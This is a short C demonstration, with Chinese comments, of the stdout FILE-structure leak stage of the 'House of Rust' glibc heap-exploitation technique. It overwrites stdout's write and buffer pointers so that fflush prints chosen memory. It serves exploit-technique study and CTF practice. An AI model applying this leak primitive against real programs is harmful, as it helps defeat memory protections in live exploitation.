/*
 * House of Rust 第四阶段的 stdout 泄漏，适用于 glibc 2.32～2.40。
 *
 * 输入原语：前一阶段已经让一次编辑覆盖 _IO_2_1_stdout_。
 * 成功判据：fflush 把 secret 所在的内存直接输出到标准输出。
 *
 * 本文件只说明 FILE 消费过程，不重复前面的 TSU/largebin 投递。
 */

#include <assert.h>
#include <stdio.h>
#include <unistd.h>

int main(void)
{
    static char secret[] = "[+] stdout 泄漏成功\n";

    /* 先清空 stdout 原来的待输出内容。 */
    assert(fflush(stdout) == 0);

    /*
     * fflush 会输出 [write_base, write_ptr) 区间。
     * 因此把这两个字段分别指向 secret 的开头和结尾。
     */
    stdout->_IO_write_base = secret;
    stdout->_IO_write_ptr = secret + sizeof(secret) - 1;
    stdout->_IO_write_end = secret + sizeof(secret) - 1;

    /* read_end 与 write_base 相同，避免输出到 pipe/终端前尝试调整文件偏移。 */
    stdout->_IO_read_end = secret;

    /* 缓冲区边界也覆盖成同一段可读内存。 */
    stdout->_IO_buf_base = secret;
    stdout->_IO_buf_end = secret + sizeof(secret) - 1;

    /* 这次 fflush 就是真正的泄漏触发器。 */
    assert(fflush(stdout) == 0);

    /* 不恢复已破坏的 stdout，直接退出。 */
    _exit(0);
}
